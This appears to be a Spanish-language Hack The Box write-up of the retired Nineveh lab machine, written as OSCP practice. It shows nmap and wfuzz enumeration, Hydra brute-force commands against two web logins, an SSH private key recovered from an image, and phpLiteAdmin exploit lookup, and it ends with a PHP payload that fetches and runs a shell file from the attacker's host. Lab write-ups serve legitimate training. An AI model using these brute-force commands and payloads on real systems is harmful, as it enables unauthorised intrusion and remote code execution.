---
layout: post
title:  "OSCP Path ~ Nineveh Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada NINEVEH siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Fueza Bruta, Hydra, Steganografia, LFI, phpLiteAdmin, RCE, PortKnocking, SSH, Chkrootkit, CRON, Maquinas Retiradas, Writeup, Hacking
---

# Lame ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.43       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
# nmap -sC -sV -p80,443 10.10.10.43 -oN target                                                                                                                                                                1 ⚙

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 12:31 CEST
Nmap scan report for 10.10.10.43
Host is up (0.054s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```
Encontramos un dominio para meter en nuestro /etc/hosts

Lanzamos el script de `nmap http-enum` a nivel web
```bash
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /info.php: Possible information file
```
Lanzamos la herramienta `Whatweb`
```bash
# whatweb http://10.10.10.43                                                                                                                                                                                  1 ⚙
http://10.10.10.43 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
```
Probamos a hacer un fuzzing a nivel del dominio web encontrado 
```bash
# wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://nineveh.htb/FUZZ                                                                                  130 ⨯ 1 ⚙
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nineveh.htb/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================

000000835:   200        485 L    974 W      11430 Ch    "db"                                                                                                                                               
000045227:   200        1 L      3 W        49 Ch       "https://nineveh.htb/"                                                                                                                             
000095511:   403        11 L     32 W       300 Ch      "server-status"                                                                                                                                    
000095763:   200        5 L      7 W        71 Ch       "secure_notes"                                                                                                                                     
```

Chequeamos la web version http y fuzzeamos como en https a ver si encontramos lo mismo o no.
```bash
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.43/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================

000003008:   200        1 L      3 W        68 Ch       "department" 
```
Encontramos un login `/department/` a nivel de `http://10.10.10.43/`

En el cual tambien podemos probar a hacer fuerza bruta, y probando usuarios vemos que para el usuario Admin tenemos una respuesta diferente dandonos a entender que el usuario 
admin existe a nivel del loguin web.
```bash
# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password\!" -V -t 64
```


A nivel https://nineveh.htb/ encontramos que en la ruta `secure_notes` hay una imagen de extension `.php`.
Nos la descargamos y miramos a ver si encontramos algo interesante:
```bash
Sacamos informacion oculta de la imagen en .png encontrada en la ruta https://nineveh.htb/secure_notes/nineveh.png 

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY/
/CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc
/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX
/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC
/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7
/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R
amrois@nineveh.htb
```
Y encontramos al posible usuario con el que conectarnos con esta clave privada de SSH
`amrois`

Guardamos la clave ssh privada encontrada con permisos 600 y hacemos memoria, ya que en los servicios abiertos no veiamos ningun servicio ssh abierto en la maquina. 

Proseguimos por otra via enumerando el directorio o ruta `/db/`
Encontramos algo interesante en /db/
```bash
phpLiteAdmin v1.9

Warning:  rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
```
Probamos a hacer fuerza bruta con `HYDRA`: 
```bash
 # hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V 
 
 [443][http-post-form] host: 10.10.10.43   login: none   "password: password123"
```
Buscamos por searchsploit:
```bash
# searchsploit phpLiteAdmin 1.9
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                                                    | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                                                     | php/webapps/39714.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Conseguimos acceder al servicio `phpLiteAdmin` 

Y leyendo la vulnerabilidad encontrada en la version 1.9.3 vemos que `creando una nueva Base de Datos` con `extension .php` podemos inyectar una nueva tabla que almacene una cadena tipo TXT en donde podemos
`meterle un codigo php malicioso`
```bash
<?php system("wget http://10.10.14.12/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
```
